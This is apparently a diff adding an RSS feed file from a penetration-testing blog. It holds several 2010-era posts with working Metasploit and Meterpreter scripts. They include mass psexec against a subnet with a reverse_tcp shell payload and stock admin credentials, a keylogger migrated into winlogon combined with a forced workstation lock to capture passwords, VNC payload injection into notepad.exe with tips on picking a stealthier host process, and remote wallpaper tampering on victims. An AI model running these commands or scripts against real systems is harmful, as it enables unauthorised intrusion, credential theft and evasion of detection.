@@ -1,0 +1,528 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Script on Room362</title>
+    <link>http://localhost:1313/tags/script/</link>
+    <description>Recent content in Script on Room362</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>&amp;copy; 2016. All rights reserved.</copyright>
+    <lastBuildDate>Mon, 13 Sep 2010 17:45:31 +0000</lastBuildDate>
+    <atom:link href="http://localhost:1313/tags/script/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Am I an Admin? Railgun Script</title>
+      <link>http://localhost:1313/post/2010/2010913am-i-an-admin-railgun-script-html/</link>
+      <pubDate>Mon, 13 Sep 2010 17:45:31 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2010/2010913am-i-an-admin-railgun-script-html/</guid>
+      <description>&lt;p&gt;When you first step on a machine, you want to determine quickly if you are just a user or an administrator. Meterpreter doesn&amp;rsquo;t have a way to quickly check this. You could drop to a shell, check the local users group &amp;ldquo;Adminitrators&amp;rdquo;, and check your user, and correlate any groups that are shared between the outputs. You could do &amp;lsquo;getsystem&amp;rsquo; and if one works other than Kitrap0d. You could also just do a &amp;lsquo;ps&amp;rsquo; and notice that you can see &amp;lsquo;SYSTEM&amp;rsquo; processes.&lt;/p&gt;
+
+&lt;p&gt;But, I wanted to make a way that check a bunch of sessions all at once. So I wrote &amp;ldquo;AmIAdmin.rb&amp;rdquo; which uses meterpreter&amp;rsquo;s railgun extension to execute &amp;ldquo;IsUserAdmin&amp;rdquo;.&lt;/p&gt;
+
+&lt;p&gt;Being that Shell32.dll isn&amp;rsquo;t included in railgun by default we have to add it. After writing it I decided to add some checks. These checks make sure that each piece of the script isn&amp;rsquo;t already loaded. It&amp;rsquo;s a good reference for doing this in the future.&lt;/p&gt;
+
+&lt;p&gt;(you can remove the print_status lines if you want the script to be quieter)&lt;/p&gt;
+
+&lt;p&gt;Here is the script for your consumption:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;if client.platform == &amp;ldquo;x64/win32&amp;rdquo;&lt;br /&gt;
+print_status &amp;ldquo;Railgun is currently not supported for x64 bit systems&amp;rdquo;&lt;br /&gt;
+raise Rex::Script::Completed&lt;br /&gt;
+end&lt;/p&gt;
+
+&lt;p&gt;if client.railgun.present? == true&lt;br /&gt;
+print_status &amp;ldquo;Railgun already loaded.. skipping&amp;rdquo;&lt;br /&gt;
+else&lt;br /&gt;
+print_status &amp;ldquo;Loading Railgun&amp;rdquo;&lt;br /&gt;
+client.core.use(&amp;ldquo;railgun&amp;rdquo;)&lt;br /&gt;
+end&lt;/p&gt;
+
+&lt;p&gt;if client.railgun.dll[&amp;lsquo;shell32&amp;rsquo;] == nil&lt;br /&gt;
+print_status &amp;ldquo;Adding Shell32.dll&amp;rdquo;&lt;br /&gt;
+client.railgun.add_dll(&amp;lsquo;shell32&amp;rsquo;,&amp;lsquo;shell32&amp;rsquo;)&lt;br /&gt;
+else&lt;br /&gt;
+print_status &amp;ldquo;Shell32 already loaded.. skipping&amp;rdquo;&lt;br /&gt;
+end&lt;/p&gt;
+
+&lt;p&gt;if (client.railgun.shell32.functions[&amp;lsquo;IsUserAnAdmin&amp;rsquo;] == nil&lt;br /&gt;
+print_status &amp;ldquo;Adding the IsUserAnAdmin function&amp;rdquo;&lt;br /&gt;
+client.railgun.add_function(&amp;lsquo;shell32&amp;rsquo;, &amp;lsquo;IsUserAnAdmin&amp;rsquo;, &amp;lsquo;BOOL&amp;rsquo;, [])&lt;br /&gt;
+else&lt;br /&gt;
+print_status &amp;ldquo;IsUserAnAdmin already loaded.. skipping&amp;rdquo;&lt;br /&gt;
+end&lt;/p&gt;
+
+&lt;p&gt;print_status &amp;ldquo;Running the IsUserAnAdmin function&amp;rdquo;&lt;br /&gt;
+status = client.railgun.shell32.IsUserAnAdmin()&lt;/p&gt;
+
+&lt;p&gt;if status[&amp;ldquo;return&amp;rdquo;] == true then&lt;br /&gt;
+print_status &amp;ldquo;You are an administrator&amp;rdquo;&lt;br /&gt;
+else&lt;br /&gt;
+print_error &amp;ldquo;You are not an administrator&amp;rdquo;&lt;br /&gt;
+end&lt;/p&gt;
+&lt;/blockquote&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Rapid fire PSEXEC for Metasploit</title>
+      <link>http://localhost:1313/post/2010/2010912rapid-fire-psexec-for-metasploit-html/</link>
+      <pubDate>Sun, 12 Sep 2010 15:06:39 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2010/2010912rapid-fire-psexec-for-metasploit-html/</guid>
+      <description>&lt;p&gt;Exploit modules inside of metasploit don&amp;rsquo;t have the ability to run on multiple hosts with one swing of the bat. So I created some code to facilitate that. It&amp;rsquo;s really not much but there are some really juicy pieces of knowledge I learned on the way here.&lt;/p&gt;
+
+&lt;p&gt;// The following is a resource file, but instead of just giving you something to download or straight copy and paste, I&amp;rsquo;ve broken it up into sections. Also take note of the &amp;ldquo;setg&amp;rdquo; which sets the variable globally so that I don&amp;rsquo;t have to set it inside of the psexec module.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;use multi/handler&lt;br /&gt;
+setg PAYLOAD windows/meterpreter/reverse_tcp&lt;br /&gt;
+setg LHOST 192.168.1.114&lt;br /&gt;
+setg LPORT 80&lt;br /&gt;
+set ExitOnSession false&lt;/p&gt;
+
+&lt;p&gt;exploit -j -z&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This first part, while nothing spectacular, sets the multi/handler up before hand so that each run of the exploit module doesn&amp;rsquo;t have to set up and tear down the handler. = fast. The following though is just the setup for the module.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;use windows/smb/psexec&lt;br /&gt;
+set SMBUser Administrator&lt;br /&gt;
+set SMBPass password123&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Here is where it gets interesting though. Windows systems want something in SMBDomain, if they aren&amp;rsquo;t joined to a domain they can take pretty much anything here.&lt;/p&gt;
+
+&lt;p&gt;However if they are actually joined to a domain, you either have to have the computer name (which definitely won&amp;rsquo;t play well with a scanner easily) or use domain credentials.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;set SMBDomain .&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;The &amp;ldquo;.&amp;rdquo; is something every Windows API programmer would know as it&amp;rsquo;s really well documented, but certainly not every Metasploit user. What it means is basically localhost, since SMB won&amp;rsquo;t take either localhost or 127.0.0.1.&lt;/p&gt;
+
+&lt;p&gt;Next up, we don&amp;rsquo;t want each run of the exploit module to build the multi/handler and tear it down every single run. That&amp;rsquo;s why we built it first and set DisablePayloadHandler inside of the psexec module.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;set DisablePayloadHandler true&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Resource files have been able run blocks of ruby in metasploit since revision 8876. By putting the &lt;ruby&gt; html like block identifier you can then use the power of Ruby combined with Rex (Metasploit&amp;rsquo;s API) to do really cool stuff.&lt;/p&gt;
+
+&lt;p&gt;More setup, but this time for the ruby portion. Using Metasploit&amp;rsquo;s RangeWalker, we can take all kinds of input, an IP, a CIDR range, and even a line separated file of IP addresses using the &amp;ldquo;file:&amp;rdquo; prefix.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&lt;ruby&gt;&lt;br /&gt;
+require &amp;lsquo;rex/socket/range_walker&amp;rsquo;&lt;br /&gt;
+rhosts = &amp;ldquo;192.168.92.0/24&amp;rdquo;&lt;br /&gt;
+iplist = Rex::Socket::RangeWalker.new(rhosts)&lt;br /&gt;
+iplist.each do |rhost|&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;So, we&amp;rsquo;ve included RangeWalker, parsed it, and loaded it into an &amp;lsquo;each&amp;rsquo; for loop.&lt;/p&gt;
+
+&lt;p&gt;The &amp;ldquo;self.run_single&amp;rdquo; function allows you to send commands like you were outside of the ruby block to msfconsole. We are setting the RHOST to each IP that RangeWalker parsed out, simple right?&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;self.run_single(&amp;ldquo;set RHOST #{rhost}&amp;rdquo;)&lt;br /&gt;
+self.run_single(&amp;ldquo;exploit -j -z&amp;rdquo;)&lt;/p&gt;
+
+&lt;p&gt;end&lt;br /&gt;
+&lt;/ruby&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;That&amp;rsquo;s it, we send all of the exploit modules one at a time to the background and tell it not to interact with it using the &amp;ldquo;-z -j&amp;rdquo; just as we did with multi/handler.&lt;/p&gt;
+
+&lt;p&gt;Now, if your credentials worked on any of the IPs you&amp;rsquo;ll have sessions waiting for you.&lt;/p&gt;
+
+&lt;p&gt;This can easily be extended with one more loop and a bit of shuffling to make this in to a SMB bruteforcer that accepts hashes!.&lt;/p&gt;
+
+&lt;p&gt;Hope you learned a few things. Oh, and just a caveat, this is NOT quiet or stealthy and will probably get you caught on a blackbox pentest, but this is really great for the smash and grab style of  CTF competitions.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Intro to RailGun: WIN API for Meterpreter</title>
+      <link>http://localhost:1313/post/2010/201077intro-to-railgun-win-api-for-meterpreter-html/</link>
+      <pubDate>Thu, 08 Jul 2010 02:10:34 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2010/201077intro-to-railgun-win-api-for-meterpreter-html/</guid>
+      <description>
+
+&lt;p&gt;Back on June 13th, &amp;ldquo;Patrick HVE&amp;rdquo; released RAILGUN:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://mail.metasploit.com/pipermail/framework/2010-June/006382.html&#34;&gt;http://mail.metasploit.com/pipermail/framework/2010-June/006382.html&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;And it was merged into the the Metasploit trunk with 9709, 9710, 9711 and 9712:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://www.metasploit.com/redmine/projects/framework/repository/revisions/9712&#34;&gt;http://www.metasploit.com/redmine/projects/framework/repository/revisions/9712&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Basically what this allows you to do is make Windows API calls from Meterpreter without compiling your own DLL. It currently supports a number of Windows API dlls:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;iphlpapi&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;ws2_32&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;kernel32&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;ntdll&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;user32&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;advapi32&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;(You can find out exactly what functions are available by default in the api.rb file)&lt;/p&gt;
+
+&lt;p&gt;It&amp;rsquo;s also very extensible, it doesn&amp;rsquo;t have a DLL or function you need? But you can read all about in the manual:&lt;/p&gt;
+
+&lt;p&gt;./external/source/meterpreter/source/extensions/railgun/railgun_manual.pdf&lt;/p&gt;
+
+&lt;p&gt;Here are two examples where this comes in very handy:&lt;/p&gt;
+
+&lt;h2 id=&#34;list-drives:1be7096449894c4f067b69b2d2c6d183&#34;&gt;List Drives:&lt;/h2&gt;
+
+&lt;p&gt;The problem that I&amp;rsquo;ve had on a number of pentests is that you get shell, but from CMD or Meterpreter there is no good way to find all of the volumes (drives) attached.&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;net use - Shows you what Network drives are connected, but not physical ones&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;fsutil fsinfo drives - You must be an administrator to ride this train&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;fdisk /status - Only on OLD versions of DOS, not sure when this disappeared&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;But railgun solves this problem with a really short script:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;h1 id=&#34;load-the-railgun-plugin-update-you-no-longer-need-this-step:1be7096449894c4f067b69b2d2c6d183&#34;&gt;Load the Railgun plugin  &lt;strong&gt;&lt;em&gt;Update: You no longer need this step&lt;/em&gt;&lt;/strong&gt;&lt;/h1&gt;
+
+&lt;p&gt;client.core.use(&amp;ldquo;railgun&amp;rdquo;)&lt;/p&gt;
+
+&lt;h1 id=&#34;make-the-api-call-to-enum-drive-letters:1be7096449894c4f067b69b2d2c6d183&#34;&gt;Make the API call to enum drive letters&lt;/h1&gt;
+
+&lt;p&gt;a = client.railgun.kernel32.GetLogicalDrives()[&amp;ldquo;return&amp;rdquo;]&lt;/p&gt;
+
+&lt;h1 id=&#34;math-magic-to-convert-the-binary-to-letters:1be7096449894c4f067b69b2d2c6d183&#34;&gt;Math magic to convert the binary to letters&lt;/h1&gt;
+
+&lt;p&gt;drives = []&lt;br /&gt;
+letters = &amp;ldquo;ABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;rdquo;&lt;br /&gt;
+(0..25).each do |i|&lt;br /&gt;
+test = letters[i,1]&lt;br /&gt;
+rem = a % (2**(i+1))&lt;br /&gt;
+if rem &amp;gt; 0&lt;br /&gt;
+drives &amp;lt;&amp;lt; test&lt;br /&gt;
+a = a - rem&lt;br /&gt;
+end&lt;br /&gt;
+end&lt;br /&gt;
+print_line(&amp;ldquo;Drives Available = #{drives.inspect}&amp;rdquo;)&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;strong&gt;Output:&lt;br /&gt;
+Drives Available = [&amp;ldquo;A&amp;rdquo;, &amp;ldquo;C&amp;rdquo;, &amp;ldquo;D&amp;rdquo;, &amp;ldquo;P&amp;rdquo;, &amp;ldquo;X&amp;rdquo;]&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Save this as a meterpreter script and it&amp;rsquo;ll print every logical drive attached to the system even as a limited user (that the user can see).&lt;/p&gt;
+
+&lt;p&gt;Logical drives include: (hdd, network, mass storage, optical, etc). This opens up the doors to infecting USB sticks and network drives…&lt;/p&gt;
+
+&lt;h2 id=&#34;jedi-keylogging:1be7096449894c4f067b69b2d2c6d183&#34;&gt;JEDI KEYLOGGING:&lt;/h2&gt;
+
+&lt;p&gt;One of the problems with keylogging is you never know when that person will log in, and if you&amp;rsquo;re using a client side, they have probably already logged in and you&amp;rsquo;re hoping they log into a portal or some other password protected site.&lt;/p&gt;
+
+&lt;p&gt;Railgun to the rescue again:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;# Start the keylogger running in the background dumping keys every 15 seconds, attached to Winlogon&lt;/strong&gt;&lt;br /&gt;
+meterpreter &amp;gt; bgrun keylogrecorder -c 1 -t 15&lt;br /&gt;
+[&lt;em&gt;] Executed Meterpreter with Job ID 0&lt;br /&gt;
+meterpreter &amp;gt; [&lt;/em&gt;] winlogon.exe Process found, migrating into 640&lt;br /&gt;
+[&lt;em&gt;] Migration Successful!!&lt;br /&gt;
+[&lt;/em&gt;] Starting the keystroke sniffer&amp;hellip;&lt;br /&gt;
+[&lt;em&gt;] Keystrokes being saved in to /root/.msf3/logs/scripts/keylogrecorder/192.168.92.122_20100707.4539.txt&lt;br /&gt;
+[&lt;/em&gt;] Recording&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;strong&gt;# Drop to IRB to initialize railgun and lockout the workstation, forcing the user to use their credentials again.&lt;/strong&gt;
+&amp;gt;
+&amp;gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;meterpreter &amp;gt; irb&lt;br /&gt;
+[&lt;em&gt;] Starting IRB shell&lt;br /&gt;
+[&lt;/em&gt;] The &amp;lsquo;client&amp;rsquo; variable holds the meterpreter client&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;client.core.use(&amp;ldquo;railgun&amp;rdquo;)&lt;br /&gt;
+=&amp;gt; true&lt;br /&gt;
+client.railgun.user32.LockWorkStation()&lt;br /&gt;
+=&amp;gt; {&amp;ldquo;GetLastError&amp;rdquo;=&amp;gt;0, &amp;ldquo;return&amp;rdquo;=&amp;gt;true}&lt;br /&gt;
+exit&lt;br /&gt;
+meterpreter &amp;gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Set up &amp;ldquo;tail -f&amp;rdquo; going on the log file for the keylogger and then kill the keylogger when you&amp;rsquo;ve gotten what you came for.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;meterpreter &amp;gt; bglist&lt;br /&gt;
+[&lt;em&gt;] Job 0: [&amp;ldquo;keylogrecorder&amp;rdquo;, &amp;ldquo;-c&amp;rdquo;, &amp;ldquo;1&amp;rdquo;, &amp;ldquo;-t&amp;rdquo;, &amp;ldquo;15&amp;rdquo;]&lt;br /&gt;
+meterpreter &amp;gt; bgkill 0&lt;br /&gt;
+[&lt;/em&gt;] Killing background job 0&amp;hellip;&lt;br /&gt;
+meterpreter &amp;gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Hope you have fun with railgun and shoot me an email &lt;a href=&#34;mailto:mubix@hak5.org&#34;&gt;mubix@hak5.org&lt;/a&gt; or leave a comment if you have any other crazy uses for railgun.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Set Wallpaper Meterpreter Script</title>
+      <link>http://localhost:1313/post/2010/2010628set-wallpaper-meterpreter-script-html/</link>
+      <pubDate>Mon, 28 Jun 2010 20:34:43 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2010/2010628set-wallpaper-meterpreter-script-html/</guid>
+      <description>&lt;p&gt;Certainly nothing to fuss over, but I&amp;rsquo;ve had a fascination with setting my target&amp;rsquo;s wallpaper as sort of a calling card for years now. I&amp;rsquo;ve been able to set the registry key (HKCUControl PanelDesktopWallpaper), but until recently I didn&amp;rsquo;t know how to get it to refresh so that it displayed without forcing the user to log out&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;First, is the most important part, selection of the wallpaper. This is my first selection:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2010/06/nettroll.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;But, it has to be a BMP. So, I created:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://static.squarespace.com/static/5005c01d24ac90096800bd6a/51cff728e4b0b79cd4cd31cb/51cff72be4b0b79cd4cd3bca/1372583736087/metasploit_1024.bmp&#34;&gt;metasploit_1024.bmp&lt;/a&gt; (2.3 MB)&lt;/p&gt;
+
+&lt;p&gt;next run: reg add &amp;ldquo;HKCUControl PanelDesktop&amp;rdquo; /v Wallpaper /t REG_MULTI_SZ /d &amp;ldquo;C:metasploit_1024.bmp&amp;rdquo;&lt;/p&gt;
+
+&lt;p&gt;and finally the magic:&lt;/p&gt;
+
+&lt;p&gt;rundll32.exe user32.dll,UpdatePerUserSystemParameters&lt;/p&gt;
+
+&lt;p&gt;thats it, run that, and it&amp;rsquo;ll refresh the settings and display the wallpaper in all of it&amp;rsquo;s glory. But I wouldn&amp;rsquo;t be a metasploit dog if I didn&amp;rsquo;t make it into a meterpreter script:&lt;/p&gt;
+
+&lt;p&gt;download: &lt;a href=&#34;http://localhost:1313/scripts-and-programs/metasploit/wallpaper.rb&#34;&gt;wallpaper.rb&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;it&amp;rsquo;s definitely not ready to be in the trunk, but it works, just edit each of the options in the file to point at the bmp you want on the victim&amp;rsquo;s wallpaper and it&amp;rsquo;ll be there.&lt;/p&gt;
+
+&lt;p&gt;Todo:&lt;/p&gt;
+
+&lt;p&gt;[*] Make each parameter an option so there is no text editing involved&lt;/p&gt;
+
+&lt;p&gt;[*] Add the ability to convert other image types on the fly&lt;/p&gt;
+
+&lt;p&gt;[*] Figure out how to get the desktop color to refresh with the wallpaper&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Meterpreter tunneling and VNC revamped</title>
+      <link>http://localhost:1313/post/2009/20091215meterpreter-tunneling-and-vnc-revamped-html/</link>
+      <pubDate>Tue, 15 Dec 2009 13:00:37 +0000</pubDate>
+      
+      <guid>http://localhost:1313/post/2009/20091215meterpreter-tunneling-and-vnc-revamped-html/</guid>
+      <description>&lt;p&gt;So yesterday (December 14th, 2009) &lt;a href=&#34;http://twitter.com/hdmoore&#34;&gt;HD Moore&lt;/a&gt; posted &lt;a href=&#34;http://twitter.com/hdmoore/status/6663737357&#34;&gt;a tweet&lt;/a&gt; with a pic of the new VNC meterpreter script that he wrote:&lt;/p&gt;
+
+&lt;p&gt;[](&lt;a href=&#34;http://static.squarespace.com/static/5005c01d24ac90096800bd6a/51cff728e4b0b79cd4cd31cb/51cff72be4b0b79cd4cd3afb/1260858699167/WindowsLiveWriter-VNCviaAMeterpreterTunnel_11BE-.com/static/5005c01d24ac90096800bd6a/51cff728e4b0b79cd4cd31cb/51cff72be4b0b79cd4cd3afc/1260858707957/WindowsLiveWriter-VNCviaAMeterpreterTunnel_11BE-&#34;&gt;http://static.squarespace.com/static/5005c01d24ac90096800bd6a/51cff728e4b0b79cd4cd31cb/51cff72be4b0b79cd4cd3afb/1260858699167/WindowsLiveWriter-VNCviaAMeterpreterTunnel_11BE-.com/static/5005c01d24ac90096800bd6a/51cff728e4b0b79cd4cd31cb/51cff72be4b0b79cd4cd3afc/1260858707957/WindowsLiveWriter-VNCviaAMeterpreterTunnel_11BE-&lt;/a&gt;)&lt;/p&gt;
+
+&lt;p&gt;Looking at the script I noticed that it created a new connection (two connections outbound). Well it was the perfect excuse to take the newly refurbished portfwd command for a spin.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://localhost:1313/scripts-and-programs/metasploit/vnc_oneport.rb&#34;&gt;http://www.room362.com/scripts-and-programs/metasploit/vnc_oneport.rb&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Or you can get it via the SVN at &lt;a href=&#34;https://metasploit.com/redmine/projects/framework/repository/revisions/7872&#34;&gt;Revision 7872&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;By creating a bind payload instead of a reverse connect we can have the payload listen locally. Then with portfwd command (just like on your home router) we forward a local port to the local host on the remote side, to the binded port. Connecting to the freshly bound port as if we were actually doing everything on the box itself. Creating a new session and a nice beautiful VNC window.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Options:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;meterpreter &amp;gt; run vnc_oneport -h&lt;/p&gt;
+
+&lt;p&gt;OPTIONS:&lt;br /&gt;
+-e &lt;opt&gt; The process to run and inject into (default: notepad.exe)&lt;br /&gt;
+-h  This help menu&lt;br /&gt;
+-l &lt;opt&gt; The local port to listen on via port forwarding (default: 5901)&lt;br /&gt;
+-p &lt;opt&gt; The port on the remote host to bind VNC to (default: randomized)&lt;/p&gt;
+
+&lt;p&gt;meterpreter &amp;gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;strong&gt;Example Run:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;[*] Meterpreter session 1 opened (192.168.92.103:4444 -&amp;gt; 192.168.92.113:1038)&lt;/p&gt;
+
+&lt;p&gt;meterpreter &amp;gt; &lt;strong&gt;&lt;em&gt;run vnc_oneport&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;[*] Creating a VNC stager: RHOST=127.0.0.1 LPORT=1207&lt;/p&gt;
+
+&lt;p&gt;[*] Host process notepad.exe has PID 532&lt;/p&gt;
+
+&lt;p&gt;[*] Allocated memory at address 0x00640000&lt;/p&gt;
+
+&lt;p&gt;[*] Writing the VNC stager into memory&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;[*] Running Payload&lt;/p&gt;
+
+&lt;p&gt;[*] Creating a new thread within notepad.exe to run the VNC stager&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;[*] Starting the port forwarding from 5901 =&amp;gt; TARGET:1207&lt;/p&gt;
+
+&lt;p&gt;[*] Local TCP relay created: 0.0.0.0:5901 &amp;lt;-&amp;gt; 127.0.0.1:1207&lt;/p&gt;
+
+&lt;p&gt;meterpreter &amp;gt; [*] VNC Server session 2 opened (127.0.0.1:56893 -&amp;gt; 127.0.0.1:5901)&lt;/p&gt;
+
+&lt;p&gt;Connected to RFB server, using protocol version 3.3&lt;/p&gt;
+
+&lt;p&gt;No authentication needed&lt;/p&gt;
+
+&lt;p&gt;Desktop name &amp;ldquo;VNCShell [SYSTEM@WORKSTATION1] - Full Access&amp;rdquo;&lt;/p&gt;
+
+&lt;p&gt;VNC server default format:&lt;/p&gt;
+
+&lt;p&gt;32 bits per pixel.&lt;/p&gt;
+
+&lt;p&gt;Least significant byte first in each pixel.&lt;/p&gt;
+
+&lt;p&gt;True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0&lt;/p&gt;
+
+&lt;p&gt;Using default colormap which is TrueColor.  Pixel format:&lt;/p&gt;
+
+&lt;p&gt;32 bits per pixel.&lt;/p&gt;
+
+&lt;p&gt;Least significant byte first in each pixel.&lt;/p&gt;
+
+&lt;p&gt;True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0&lt;/p&gt;
+
+&lt;p&gt;Using shared memory PutImage&lt;/p&gt;
+
+&lt;p&gt;Same machine: preferring raw encoding&lt;/p&gt;
+
+&lt;p&gt;ShmCleanup called&lt;/p&gt;
+
+&lt;p&gt;[*] VNC Server session 2 closed.&lt;/p&gt;
+
+&lt;p&gt;meterpreter &amp;gt;&lt;/p&gt;
+
+&lt;p&gt;[&lt;em&gt;] Meterpreter session 1 opened (192.168.92.103:4444 -&amp;gt; 192.168.92.113:1038)&lt;br /&gt;
+meterpreter &amp;gt; run vnc_oneport&lt;br /&gt;
+[&lt;/em&gt;] Creating a VNC stager: RHOST=127.0.0.1 LPORT=1207&lt;br /&gt;
+[&lt;em&gt;] Host process notepad.exe has PID 532&lt;br /&gt;
+[&lt;/em&gt;] Allocated memory at address 0x00640000&lt;br /&gt;
+[&lt;em&gt;] Writing the VNC stager into memory&amp;hellip;&lt;br /&gt;
+[&lt;/em&gt;] Running Payload&lt;br /&gt;
+[&lt;em&gt;] Creating a new thread within notepad.exe to run the VNC stager&amp;hellip;&lt;br /&gt;
+[&lt;/em&gt;] Starting the port forwarding from 5901 =&amp;gt; TARGET:1207&lt;br /&gt;
+[&lt;em&gt;] Local TCP relay created: 0.0.0.0:5901 &amp;lt;-&amp;gt; 127.0.0.1:1207&lt;br /&gt;
+meterpreter &amp;gt; [&lt;/em&gt;] VNC Server session 2 opened (127.0.0.1:56893 -&amp;gt; 127.0.0.1:5901)&lt;br /&gt;
+Connected to RFB server, using protocol version 3.3&lt;br /&gt;
+No authentication needed&lt;br /&gt;
+Desktop name &amp;ldquo;VNCShell [SYSTEM@WORKSTATION1] - Full Access&amp;rdquo;VNC server default format: 32 bits per pixel. Least significant byte first in each pixel. True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0&lt;br /&gt;
+Using default colormap which is TrueColor.  Pixel format: 32 bits per pixel. Least significant byte first in each pixel. True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0&lt;br /&gt;
+Using shared memory PutImageSame machine: preferring raw encodingShmCleanup called&lt;br /&gt;
+[*] VNC Server session 2 closed.&lt;/p&gt;
+
+&lt;p&gt;meterpreter &amp;gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;The forwarded port does not close even if the meterpreter session is ended, so use the following command to close the forward:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;meterpreter &amp;gt; portfwd delete -l 5901&lt;br /&gt;
+[*] Successfully stopped TCP relay on 0.0.0.0:5901&lt;/p&gt;
+
+&lt;p&gt;meterpreter &amp;gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;(Note to BT4 users: do a &lt;code&gt;apt-get install vncviewer&lt;/code&gt; before using any of the vnc payloads in Metasploit)&lt;/p&gt;
+
+&lt;p&gt;The script utilizes just one of the millions of way you can leverage &amp;lsquo;portfwd&amp;rsquo; in your endeavors. But where it gets interesting is the fact that the delivery method for the payload never touches disk. That magic is all credited to HD though. What happens is a new process is created (notepad by default) and the newly created VNC bind payload is injected into it. But, the beauty is that it&amp;rsquo;s doing local connections via the port forwarding so all you see in TCPView is:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2009/12/vnc_oneport_post_tcpview.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now it&amp;rsquo;s definitely suspicious that Notepad has any connections at all, but you can use the option &lt;code&gt;-e&lt;/code&gt; to provide any executable you wish, as long as it&amp;rsquo;s in the path for the system. For examples, look at what&amp;rsquo;s running naturally already.&lt;/p&gt;
+
+&lt;p&gt;Plus, you would probably not be using port 4444 for a meterpreter session. But what I wanted to demonstrate with this script is the power of both meterpreter, and port forwarding.&lt;/p&gt;
+
